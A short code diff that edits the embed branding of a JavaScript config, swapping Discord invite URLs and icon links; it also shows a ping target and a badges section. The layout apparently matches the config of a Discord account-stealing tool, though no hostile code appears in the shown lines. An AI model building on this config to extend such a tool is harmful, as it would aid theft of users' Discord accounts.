@@ -23,13 +23,13 @@ var config = {
     ping: [true, "@doener"],
 
     embed: {
-        username: "https://discord.gg/9GfN3UP3TJ",
+        username: "discord.gg/9GfN3UP3TJ",
         footer: {
-            text: `https://discord.gg/9GfN3UP3TJ`,
-            icon_url: "https://cdn.discordapp.com/attachments/1204447694643400714/1206170208511852554/atam.gif?size=96&quality=lossless",
+            text: `discord.gg/9GfN3UP3TJ`,
+            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
         },
-        href: "https://discord.gg/9GfN3UP3TJ",
-        avatar_url: "https://cdn.discordapp.com/attachments/1204447694643400714/1206170208511852554/atam.gif?size=96&quality=lossless"
+        href: "discord.gg/9GfN3UP3TJ",
+        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
     },
 
     badges: {
